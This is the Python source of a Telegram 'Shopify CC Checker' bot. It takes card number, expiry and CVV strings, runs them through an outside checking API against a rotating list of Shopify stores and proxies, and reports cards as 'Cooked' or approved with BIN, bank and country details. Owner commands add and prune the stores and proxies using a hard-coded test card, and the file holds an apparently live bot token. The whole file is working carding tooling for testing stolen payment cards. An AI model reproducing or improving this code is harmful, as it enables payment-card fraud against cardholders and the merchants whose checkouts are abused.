import os
import re
import json
import random
import time
import requests
import telebot
from telebot import types
from datetime import datetime

BOT_TOKEN = "7753796700:AAFGwblL3xj0i0Kx0H0fwgRLQnaAoM6b6WM"

OWNER_ID = [7577002994, 1614278744]
DARKS_ID = 7577002994

bot = telebot.TeleBot(BOT_TOKEN)

SITES_FILE = "sites.json"
PROXIES_FILE = "proxies.json"
STATS_FILE = "stats.json"

def load_json(file_path, default_data):
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as f:
                return json.load(f)
        except:
            return default_data
    return default_data

def save_json(file_path, data):
    with open(file_path, 'w') as f:
        json.dump(data, f, indent=4)

# Load data
sites_data = load_json(SITES_FILE, {"sites": []})
proxies_data = load_json(PROXIES_FILE, {"proxies": []})
stats_data = load_json(STATS_FILE, {"approved": 0, "declined": 0, "cooked": 0})

status_emoji = {
    'APPROVED': '🔥',
    'APPROVED_OTP': '✅',
    'DECLINED': '❌',
    'EXPIRED': '👋',
    'ERROR': '⚠️'
}

status_text = {
    'APPROVED': '𝐂𝐨𝐨𝐤𝐞𝐝',
    'APPROVED_OTP': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
    'DECLINED': '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝',
    'EXPIRED': '𝐄𝐱𝐩𝐢𝐫𝐞𝐝',
    'ERROR': '𝐄𝐫𝐫𝐨𝐫'
}

# Check if user is owner
def is_owner(user_id):
    return user_id in OWNER_ID

# Extract CC from various formats
def extract_cc(text):
    # Remove any non-digit characters except |, :, ., /, and space
    cleaned = re.sub(r'[^\d|:./ ]', '', text)
    
    # Handle various formats
    if '|' in cleaned:
        parts = cleaned.split('|')
    elif ':' in cleaned:
        parts = cleaned.split(':')
    elif '.' in cleaned:
        parts = cleaned.split('.')
    elif '/' in cleaned:
        parts = cleaned.split('/')
    else:
        # Handle raw numbers (e.g., 42424242424242421234991234)
        if len(cleaned) >= 16:
            cc = cleaned[:16]
            rest = cleaned[16:]
            if len(rest) >= 4:
                mm = rest[:2]
                rest = rest[2:]
                if len(rest) >= 4:
                    yyyy = rest[:4] if len(rest) >= 4 else rest[:2]
                    rest = rest[4:] if len(rest) >= 4 else rest[2:]
                    if len(rest) >= 3:
                        cvv = rest[:3]
                        parts = [cc, mm, yyyy, cvv]
    
    if len(parts) < 4:
        return None
    
    # Standardize the format
    cc = parts[0].strip()
    mm = parts[1].strip()
    yyyy = parts[2].strip()
    cvv = parts[3].strip()
    
    # Handle 2-digit year - FIXED LOGIC
    if len(yyyy) == 2:
        current_year_short = datetime.now().year % 100
        year_int = int(yyyy)
        # If 2-digit year is less than or equal to current year, assume 2000s
        # Otherwise assume 1900s (for expired cards)
        yyyy = f"20{yyyy}" if year_int >= current_year_short else f"19{yyyy}"
    
    return f"{cc}|{mm}|{yyyy}|{cvv}"

# Get bin info
def get_bin_info(card_number):
    # Clean the card number (remove any non-digit characters)
    card_number = re.sub(r'\D', '', card_number)
    
    # Get the first 6 digits for BIN
    if len(card_number) < 6:
        return None
        
    bin_code = card_number[:6]
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=10)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

# Check site with API
def check_site(site, cc, proxy=None):
    url = f"https://shopify.stormx.pw/index.php?site={site}&cc={cc}"
    if proxy:
        url += f"&proxy={proxy}"
    
    try:
        response = requests.get(url, timeout=15)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

# Check if response is valid
def is_valid_response(response):
    if not response:
        return False
    
    response_upper = response.get("Response", "").upper()
    # Check if response is valid
    return any(x in response_upper for x in ['CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                                           'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                                           'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED' , "INCORRECT_NUMBER"])

# Process API response
def process_response(api_response, price):
    if not api_response:
        return "ERROR", "API_ERROR", "Unknown"
    
    response_upper = api_response.get("Response", "").upper()
    gateway = api_response.get("Gateway", "Normal")
    
    if 'THANK YOU' in response_upper:
        response = 'ORDER CONFIRM!'
        status = 'APPROVED'
    elif '3D' in response_upper:
        response = 'OTP_REQUIRED'
        status = 'APPROVED_OTP'
    elif any(x in response_upper for x in ['EXPIRED_CARD', 'EXPIRE_CARD', 'EXPIRED']):
        response = 'EXPIRE_CARD'
        status = 'EXPIRED'
    elif any(x in response_upper for x in ['INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP']):
        response = response_upper
        status = 'APPROVED_OTP'
    elif 'CARD_DECLINED' in response_upper:
        response = 'CARD_DECLINED'
        status = 'DECLINED'
    elif 'INCORRECT_NUMBER' in response_upper:  
        response = 'INCORRECT_NUMBER'
        status = 'DECLINED'
    elif 'FRAUD_SUSPECTED' in response_upper:  
        response = 'FRAUD_SUSPECTED'
        status = 'DECLINED'
    else:
        response = response_upper
        status = 'DECLINED'
    
    return response, status, gateway

def format_message(cc, response, status, gateway, price, bin_info, user_id, full_name, time_taken):
    emoji = status_emoji.get(status, '⚠️')
    status_msg = status_text.get(status, '𝐄𝐫𝐫𝐨𝐫')
    
    # Extract card details
    cc_parts = cc.split('|')
    card_number = cc_parts[0]
    
    # Get bin info if available
    if bin_info:
        card_info = bin_info.get('brand', 'UNKNOWN') + ' ' + bin_info.get('type', 'UNKNOWN')
        issuer = bin_info.get('bank', 'UNKNOWN')
        country = bin_info.get('country_name', 'UNKNOWN')
        flag = bin_info.get('country_flag', '🇺🇳')
    else:
        card_info = 'UNKNOWN'
        issuer = 'UNKNOWN'
        country = 'UNKNOWN'
        flag = '🇺🇳'
    
    # Make clickable mention
    safe_name = full_name.replace("<", "").replace(">", "")  # avoid HTML issues
    user_mention = f'<a href="tg://user?id={user_id}">{safe_name}</a>'
    
    message = f"""
┏━━━━━━━⍟
┃ <strong>{status_msg}</strong> {emoji}
┗━━━━━━━━━━━⊛

[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐂𝐚𝐫𝐝</strong>↣<code>{cc}</code>
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</strong>↣{gateway} [{price}$]
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</strong>↣ <code>{response}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐁𝐫𝐚𝐧𝐝</strong>↣{card_info}
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐁𝐚𝐧𝐤</strong>↣{issuer}
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐂𝐨𝐮𝐧𝐭𝐫𝐲</strong>↣{country} {flag}
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲</strong>↣ {user_mention}
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐁𝐨𝐭 𝐁𝐲</strong>↣ <a href="tg://user?id={DARKS_ID}">⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲 ꯭𖠌</a>
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐓𝐢𝐦𝐞</strong>↣ {time_taken} <strong>𝐬𝐞𝐜𝐨𝐧𝐝𝐬</strong>
"""
    return message

# Update stats
def update_stats(status):
    if status == 'APPROVED':
        stats_data['cooked'] += 1
    elif status in ['APPROVED', 'APPROVED_OTP']:
        stats_data['approved'] += 1
    elif status in ['DECLINED', 'EXPIRED', 'ERROR']:
        stats_data['declined'] += 1
    
    save_json(STATS_FILE, stats_data)

# Command handlers
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    help_text = """
Welcome to Shopify CC Checker Bot!

Available Commands:
• /sh CC|MM|YYYY|CVV - Check a card
• /s CC|MM|YYYY|CVV - Short command for checking
• .sh CC|MM|YYYY|CVV - Alternative command
• .s CC|MM|YYYY|CVV - Alternative command
• cook CC|MM|YYYY|CVV - Alternative command

Owner Commands:
• /addurls <urls> - Add multiple sites
• /addpro <proxy> - Add a proxy
• /clean - Clean invalid sites
• /cleanpro - Clean invalid proxies
• /rmsites - Remove all sites
• /rmpro - Remove all proxies
• /stats - Show bot statistics
• /viewsites - View all sites
"""
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['sh' , 's'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sh'))
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.s'))
@bot.message_handler(func=lambda m: m.text and m.text.startswith('cook'))
@bot.message_handler(func=lambda m: m.text and m.text.startswith('Cook'))
def handle_cc_check(message):
    # Check if command has CC or is a reply to a message with CC
    cc_text = None
    
    if len(message.text.split()) > 1:
        cc_text = message.text.split(' ', 1)[1]
    elif message.reply_to_message:
        cc_text = message.reply_to_message.text
    
    if not cc_text:
        bot.reply_to(message, "Please provide a CC in format: /sh CC|MM|YYYY|CVV or reply to a message with CC.")
        return
    
    # Extract CC from text
    cc = extract_cc(cc_text)
    if not cc:
        bot.reply_to(message, "Invalid CC format. Please use CC|MM|YYYY|CVV format.")
        return
    
    # Send initial message
    processing_msg = bot.reply_to(message, "𝐂𝐨𝐨𝐤𝐢𝐧𝐠 𝐘𝐨𝐮𝐫 𝐎𝐫𝐝𝐞𝐫. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 🔥")
    
    # Get bin info from the extracted CC (not the original text)
    card_number = cc.split('|')[0]
    bin_info = get_bin_info(card_number)
    
    # Get random proxy
    proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None
    
    if not sites_data['sites']:
        bot.edit_message_text("No sites available. Please add sites first.", 
                             chat_id=message.chat.id, 
                             message_id=processing_msg.message_id)
        return
    
    # Start timer
    start_time = time.time()
    
    # Try multiple sites until we get a valid response
    max_retries = min(5, len(sites_data['sites']))  # Try up to 5 sites
    sites_tried = 0
    api_response = None
    site_obj = None
    
    # Shuffle sites to try different ones each time
    shuffled_sites = sites_data['sites'].copy()
    random.shuffle(shuffled_sites)
    
    for i, current_site_obj in enumerate(shuffled_sites[:max_retries]):
        sites_tried += 1
        site = current_site_obj['url']
        price = current_site_obj.get('price', '0.00')
        
        # Update status if trying multiple sites
        if i > 0:
            try:
                bot.edit_message_text(
                    f"𝐒𝐢𝐭𝐞 𝐃𝐞𝐚𝐝 🚫\n𝐋𝐞𝐭'𝐬 𝐂𝐨𝐨𝐤 𝐖𝐢𝐭𝐡 𝐀𝐧𝐨𝐭𝐡𝐞𝐫 𝐒𝐢𝐭𝐞 🔥\n\n𝐓𝐫𝐲𝐢𝐧𝐠 𝐒𝐢𝐭𝐞 {i+1}/{max_retries}",
                    chat_id=message.chat.id,
                    message_id=processing_msg.message_id
                )
            except:
                pass
        
        # Check site
        api_response = check_site(site, cc, proxy)
        
        # If we got a valid response, use this site
        if is_valid_response(api_response):
            site_obj = current_site_obj
            break
        
        # Small delay between site attempts
        time.sleep(1)
    
    # If no site worked, use the last one tried
    if not site_obj and shuffled_sites:
        site_obj = shuffled_sites[min(sites_tried-1, len(shuffled_sites)-1)]
        price = site_obj.get('price', '0.00')
    
    # Calculate time taken
    time_taken = round(time.time() - start_time, 2)
    
    # Process response
    response, status, gateway = process_response(api_response, price)
    
    # Update stats
    update_stats(status)
    
    # Get user full name properly
    first = message.from_user.first_name or ""
    last = message.from_user.last_name or ""
    full_name = f"{first} {last}".strip()
    
    # Format final message with clickable full name
    final_message = format_message(
        cc, response, status, gateway, price, bin_info,
        message.from_user.id, full_name, time_taken
    )
    
    # Edit the processing message with result
    bot.edit_message_text(
        final_message,
        chat_id=message.chat.id,
        message_id=processing_msg.message_id,
        parse_mode='HTML'
    )

import re

def extract_urls(text):
    # Regex to catch domains + URLs
    pattern = r"(https?://[^\s]+|[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})"
    urls = re.findall(pattern, text)
    # Clean duplicates & normalize
    cleaned = []
    for u in urls:
        u = u.strip()
        if not u.startswith("http"):
            u = "http://" + u  # normalize
        if u not in cleaned:
            cleaned.append(u)
    return cleaned


import re
import time
from urllib.parse import urlparse

@bot.message_handler(commands=['addurls'])
def handle_add_sites(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Please provide URLs to add. Format: /addurls <url1> <url2> ...")
        return
    
    # Extract and clean URLs from the message
    raw_text = message.text
    urls = extract_urls(raw_text)
    
    if not urls:
        bot.reply_to(message, "No valid URLs found in your message.")
        return
    
    added_count = 0
    total_count = len(urls)
    
    # Send initial processing message
    status_msg = bot.reply_to(message, f"🔍 Checking {total_count} sites...\n\nAdded: 0/{total_count}\nSkipped: 0/{total_count}")
    
    skipped_count = 0
    
    for i, url in enumerate(urls):
        # Update status message
        try:
            bot.edit_message_text(
                f"🔍 Checking {total_count} sites...\n\nChecking: {url}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                chat_id=message.chat.id,
                message_id=status_msg.message_id
            )
        except:
            pass
        
        # Test the URL with a sample card
        test_cc = "5242430428405662|03|28|323"
        response = check_site(url, test_cc)
        
        if response:
            response_upper = response.get("Response", "").upper()
            # Check if response is valid
            if any(x in response_upper for x in ['CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                                               'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                                               'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED' , 'INCORRECT_NUMBER']):
                
                # Get price from response or use default
                price = response.get("Price", "0.00")
                
                # Check if site already exists
                site_exists = any(site['url'] == url for site in sites_data['sites'])
                
                if not site_exists:
                    # Add site to list
                    sites_data['sites'].append({
                        "url": url,
                        "price": price
                    })
                    added_count += 1
                    
                    # Update status with success
                    try:
                        bot.edit_message_text(
                            f"🔍 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 {total_count} 𝐒𝐢𝐭𝐞𝐬...\n\n✅ 𝐀𝐝𝐝𝐞𝐝: {url}\n𝐀𝐝𝐝𝐞𝐝: {added_count}/{total_count}\n𝐒𝐤𝐢𝐩𝐩𝐞𝐝: {skipped_count}/{total_count}",
                            chat_id=message.chat.id,
                            message_id=status_msg.message_id
                        )
                    except:
                        pass
                else:
                    skipped_count += 1
                    # Update status with skip (duplicate)
                    try:
                        bot.edit_message_text(
                            f"🔍 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 {total_count} sites...\n\n⚠️ 𝐒𝐤𝐢𝐩𝐩𝐞𝐝 (duplicate): {url}\n𝐀𝐝𝐝𝐞𝐝: {added_count}/{total_count}\n𝐒𝐤𝐢𝐩𝐩𝐞𝐝: {skipped_count}/{total_count}",
                            chat_id=message.chat.id,
                            message_id=status_msg.message_id
                        )
                    except:
                        pass
            else:
                skipped_count += 1
                # Update status with skip (invalid response)
                try:
                    bot.edit_message_text(
                        f"🔍 Checking {total_count} sites...\n\n❌ 𝐒𝐤𝐢𝐩𝐩𝐞𝐝 (invalid): {url}\nResponse: {response.get('Response', 'NO_RESPONSE')}\n𝐀𝐝𝐝𝐞𝐝: {added_count}/{total_count}\n𝐒𝐤𝐢𝐩𝐩𝐞𝐝: {skipped_count}/{total_count}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                except:
                    pass
        else:
            skipped_count += 1
            # Update status with skip (no response)
            try:
                bot.edit_message_text(
                    f"🔍 Checking {total_count} sites...\n\n❌ Skipped (no response): {url}\nAdded: {added_count}/{total_count}\nSkipped: {skipped_count}/{total_count}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id
                )
            except:
                pass
        
        # Small delay to avoid rate limiting
        time.sleep(1)
    
    # Save updated sites
    save_json(SITES_FILE, sites_data)
    
    # Final update
    bot.edit_message_text(
        f"✅ 𝐒𝐢𝐭𝐞 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝!\n\n𝐀𝐝𝐝𝐞𝐝: {added_count} new sites\n𝐒𝐤𝐢𝐩𝐩𝐞𝐝: {skipped_count} sites\n𝐓𝐨𝐭𝐚𝐥 𝐒𝐢𝐭𝐞𝐬: {len(sites_data['sites'])}",
        chat_id=message.chat.id,
        message_id=status_msg.message_id
    )

def extract_urls(text):
    """
    Extract valid URLs from text that might contain jumbled/waste characters
    """
    # Split the text and look for potential URLs
    parts = text.split()
    potential_urls = []
    
    # Remove the command itself
    if parts and parts[0] == '/addurls':
        parts = parts[1:]
    
    # Try to find URLs in each part
    for part in parts:
        # Clean the part by removing non-URL characters from start/end
        cleaned = clean_string(part)
        
        # Check if it looks like a URL
        if is_likely_url(cleaned):
            # Ensure it has a scheme
            if not cleaned.startswith(('http://', 'https://')):
                cleaned = 'https://' + cleaned
            potential_urls.append(cleaned)
    
    return potential_urls

def clean_string(s):
    """
    Remove junk characters from the start and end of a string
    """
    # Remove non-alphanumeric characters from start
    while s and not s[0].isalnum():
        s = s[1:]
    
    # Remove non-alphanumeric characters from end
    while s and not s[-1].isalnum():
        s = s[:-1]
    
    return s

def is_likely_url(s):
    """
    Check if a string is likely to be a URL
    """
    # Check for common TLDs
    tlds = ['.com', '.org', '.net', '.io', '.gov', '.edu', '.info', '.co', '.uk', '.us', '.ca', '.au', '.de', '.fr']
    
    # Check if it contains a TLD
    has_tld = any(tld in s for tld in tlds)
    
    # Check if it has a domain structure
    has_domain_structure = '.' in s and len(s.split('.')) >= 2
    
    # Check if it's not too short
    not_too_short = len(s) > 4
    
    return (has_tld or has_domain_structure) and not_too_short


@bot.message_handler(commands=['addpro'])
def handle_add_proxy(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Please provide proxy to add. Format: /addpro host:port:user:pass")
        return
    
    proxy = message.text.split(' ', 1)[1]
    
    # Send initial message
    status_msg = bot.reply_to(message, f"🔍 Testing proxy: {proxy.split(':')[0]}...")
    
    # Test the proxy with a random site and sample card
    if sites_data['sites']:
        site_obj = random.choice(sites_data['sites'])
        test_cc = "5242430428405662|03|28|323"
        response = check_site(site_obj['url'], test_cc, proxy)
        
        if response:
            response_upper = response.get("Response", "").upper()
            # Check if response is valid
            if any(x in response_upper for x in ['CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                                               'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                                               'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED']):
                
                # Check if proxy already exists
                if proxy not in proxies_data['proxies']:
                    # Add proxy to list
                    proxies_data['proxies'].append(proxy)
                    save_json(PROXIES_FILE, proxies_data)
                    bot.edit_message_text(
                        f"✅ Proxy added successfully!\n\nTotal proxies: {len(proxies_data['proxies'])}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                else:
                    bot.edit_message_text(
                        f"⚠️ Proxy already exists!\n\nTotal proxies: {len(proxies_data['proxies'])}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                return
            else:
                bot.edit_message_text(
                    f"❌ Invalid response from proxy: {response_upper}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id
                )
                return
        else:
            bot.edit_message_text(
                "❌ No response from proxy. Invalid proxy or test failed.",
                chat_id=message.chat.id,
                message_id=status_msg.message_id
            )
            return
    
    bot.edit_message_text(
        "❌ No sites available to test proxy.",
        chat_id=message.chat.id,
        message_id=status_msg.message_id
    )

@bot.message_handler(commands=['clean'])
def handle_clean_sites(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    # Send initial message
    total_sites = len(sites_data['sites'])
    status_msg = bot.reply_to(message, f"🔍 Cleaning {total_sites} sites...\n\nChecked: 0/{total_sites}\nValid: 0\nInvalid: 0")
    
    # Test all sites and remove invalid ones
    valid_sites = []
    test_cc = "5242430428405662|03|28|323"
    
    for i, site_obj in enumerate(sites_data['sites']):
        # Update status
        try:
            bot.edit_message_text(
                f"🔍 Cleaning {total_sites} sites...\n\nChecking: {site_obj['url']}\nChecked: {i+1}/{total_sites}\nValid: {len(valid_sites)}\nInvalid: {i - len(valid_sites)}",
                chat_id=message.chat.id,
                message_id=status_msg.message_id
            )
        except:
            pass
        
        response = check_site(site_obj['url'], test_cc)
        if response:
            response_upper = response.get("Response", "").upper()
            if any(x in response_upper for x in ['CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                                               'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                                               'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED']):
                # Update the site's last response
                site_obj['last_response'] = response.get("Response", "Unknown")
                site_obj['gateway'] = response.get("Gateway", "Unknown")
                valid_sites.append(site_obj)
                # Update with response
                try:
                    bot.edit_message_text(
                        f"🔍 Cleaning {total_sites} sites...\n\n✅ Valid: {site_obj['url']}\nResponse: {response.get('Response', 'VALID')}\nChecked: {i+1}/{total_sites}\nValid: {len(valid_sites)}\nInvalid: {i - len(valid_sites) + 1}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                except:
                    pass
            else:
                # Update with invalid response
                try:
                    bot.edit_message_text(
                        f"🔍 Cleaning {total_sites} sites...\n\n❌ Invalid: {site_obj['url']}\nResponse: {response.get('Response', 'INVALID')}\nChecked: {i+1}/{total_sites}\nValid: {len(valid_sites)}\nInvalid: {i - len(valid_sites) + 1}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                except:
                    pass
        else:
            # Update with no response
            try:
                bot.edit_message_text(
                    f"🔍 Cleaning {total_sites} sites...\n\n❌ No response: {site_obj['url']}\nChecked: {i+1}/{total_sites}\nValid: {len(valid_sites)}\nInvalid: {i - len(valid_sites) + 1}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id
                )
            except:
                pass
        
        # Small delay to avoid rate limiting
        time.sleep(0.5)
    
    sites_data['sites'] = valid_sites
    save_json(SITES_FILE, sites_data)
    
    # Final update
    removed_count = total_sites - len(valid_sites)
    bot.edit_message_text(
        f"✅ Site cleaning completed!\n\nRemoved: {removed_count} invalid sites\nTotal sites: {len(valid_sites)}",
        chat_id=message.chat.id,
        message_id=status_msg.message_id
    )

@bot.message_handler(commands=['cleanpro'])
def handle_clean_proxies(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    # Send initial message
    total_proxies = len(proxies_data['proxies'])
    status_msg = bot.reply_to(message, f"🔍 Cleaning {total_proxies} proxies...\n\nChecked: 0/{total_proxies}\nValid: 0\nInvalid: 0")
    
    # Test all proxies and remove invalid ones
    valid_proxies = []
    test_cc = "5242430428405662|03|28|323"
    
    if sites_data['sites']:
        site_obj = random.choice(sites_data['sites'])
        
        for i, proxy in enumerate(proxies_data['proxies']):
            # Update status
            try:
                bot.edit_message_text(
                    f"🔍 Cleaning {total_proxies} proxies...\n\nChecking: {proxy.split(':')[0]}\nChecked: {i+1}/{total_proxies}\nValid: {len(valid_proxies)}\nInvalid: {i - len(valid_proxies)}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id
                )
            except:
                pass
            
            response = check_site(site_obj['url'], test_cc, proxy)
            if response:
                response_upper = response.get("Response", "").upper()
                if any(x in response_upper for x in ['CARD_DECLINED', '3D', 'THANK YOU', 'EXPIRED_CARD', 
                                                   'EXPIRE_CARD', 'EXPIRED', 'INSUFFICIENT_FUNDS', 
                                                   'INCORRECT_CVC', 'INCORRECT_ZIP', 'FRAUD_SUSPECTED']):
                    valid_proxies.append(proxy)
                    # Update with valid response
                    try:
                        bot.edit_message_text(
                            f"🔍 Cleaning {total_proxies} proxies...\n\n✅ Valid: {proxy.split(':')[0]}\nResponse: {response.get('Response', 'VALID')}\nChecked: {i+1}/{total_proxies}\nValid: {len(valid_proxies)}\nInvalid: {i - len(valid_proxies) + 1}",
                            chat_id=message.chat.id,
                            message_id=status_msg.message_id
                        )
                    except:
                        pass
                else:
                    # Update with invalid response
                    try:
                        bot.edit_message_text(
                            f"🔍 Cleaning {total_proxies} proxies...\n\n❌ Invalid: {proxy.split(':')[0]}\nResponse: {response.get('Response', 'INVALID')}\nChecked: {i+1}/{total_proxies}\nValid: {len(valid_proxies)}\nInvalid: {i - len(valid_proxies) + 1}",
                            chat_id=message.chat.id,
                            message_id=status_msg.message_id
                        )
                    except:
                        pass
            else:
                # Update with no response
                try:
                    bot.edit_message_text(
                        f"🔍 Cleaning {total_proxies} proxies...\n\n❌ No response: {proxy.split(':')[0]}\nChecked: {i+1}/{total_proxies}\nValid: {len(valid_proxies)}\nInvalid: {i - len(valid_proxies) + 1}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                except:
                    pass
            
            # Small delay to avoid rate limiting
            time.sleep(1)
    
    proxies_data['proxies'] = valid_proxies
    save_json(PROXIES_FILE, proxies_data)
    
    # Final update
    removed_count = total_proxies - len(valid_proxies)
    bot.edit_message_text(
        f"✅ Proxy cleaning completed!\n\nRemoved: {removed_count} invalid proxies\nTotal proxies: {len(valid_proxies)}",
        chat_id=message.chat.id,
        message_id=status_msg.message_id
    )

@bot.message_handler(commands=['rmsites'])
def handle_remove_sites(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    count = len(sites_data['sites'])
    sites_data['sites'] = []
    save_json(SITES_FILE, sites_data)
    bot.reply_to(message, f"✅ All {count} sites removed.")

@bot.message_handler(commands=['rmpro'])
def handle_remove_proxies(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    count = len(proxies_data['proxies'])
    proxies_data['proxies'] = []
    save_json(PROXIES_FILE, proxies_data)
    bot.reply_to(message, f"✅ All {count} proxies removed.")

@bot.message_handler(commands=['stats'])
def handle_stats(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return

    stats_msg = f"""
┏━━━━━━━⍟
┃ <strong>📊 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐢𝐬𝐭𝐢𝐜𝐬</strong> 📈
┗━━━━━━━━━━━⊛

[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐒𝐢𝐭𝐞𝐬</strong> ↣ <code>{len(sites_data['sites'])}</code>
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐏𝐫𝐨𝐱𝐢𝐞𝐬</strong> ↣ <code>{len(proxies_data['proxies'])}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅</strong> ↣ <code>{stats_data['approved']}</code>
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐂𝐨𝐨𝐤𝐞𝐝 🔥</strong> ↣ <code>{stats_data['cooked']}</code>
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌</strong> ↣ <code>{stats_data['declined']}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐬</strong> ↣ <code>{stats_data['approved'] + stats_data['cooked'] + stats_data['declined']}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/stormxvup">⌬</a>] <strong>𝐁𝐨𝐭 𝐁𝐲</strong> ↣ <a href="tg://user?id={DARKS_ID}">⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲 ꯭𖠌</a>
"""

    bot.reply_to(message, stats_msg, parse_mode="HTML")


@bot.message_handler(commands=['viewsites'])
def handle_view_sites(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Jhant Bhar ka Admi asa kr kaise sakta hai..")
        return
    
    if not sites_data['sites']:
        bot.reply_to(message, "No sites available.")
        return
    
    # Header
    sites_list = """

<strong>🌐 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐒𝐢𝐭𝐞𝐬</strong> 🔥

"""

    # Table header
    sites_list += "━━━━━━━━━━━━━━━━━━━\n"
    sites_list += "<strong>𝐒𝐢𝐭𝐞</strong> ↣          <strong>𝐏𝐫𝐢𝐜𝐞</strong> ↣             <strong>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</strong>\n"
    sites_list += "━━━━━━━━━━━━━━━━━━━\n"
    
    # List sites
    for i, site in enumerate(sites_data['sites'][:20]):  # Show first 20 sites
        url_short = site['url'][:20] + "..." if len(site['url']) > 20 else site['url']
        price = site.get('price', '0.00')
        response = site.get('last_response', 'Unknown')
        response_short = response[:15] + "..." if response and len(response) > 15 else response

        sites_list += f"🔹 <code>{url_short}</code> ↣ 💲<strong>{price}</strong> ↣ <code>{response_short}</code>\n"

    # More sites note
    if len(sites_data['sites']) > 20:
        sites_list += f"\n...and <strong>{len(sites_data['sites']) - 20}</strong> more sites ⚡"

    sites_list += "\n━━━━━━━━━━━━━━━━━━━\n"
